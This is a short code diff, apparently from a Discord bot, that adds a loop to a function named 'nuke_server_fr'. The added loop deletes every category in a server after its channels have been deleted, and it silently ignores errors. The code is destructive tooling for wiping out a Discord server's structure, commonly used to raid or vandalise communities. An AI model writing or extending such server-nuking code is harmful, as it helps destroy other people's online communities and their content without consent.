@@ -579,7 +579,13 @@ async def nuke_server_fr(ctx):
                             await channel.delete()
                         except:
                             None
-
+                    
+                    for category in ctx.guild.categories:
+                        try:
+                            await category.delete()
+                        except:
+                            None
+                    
                 except:
                     None
 
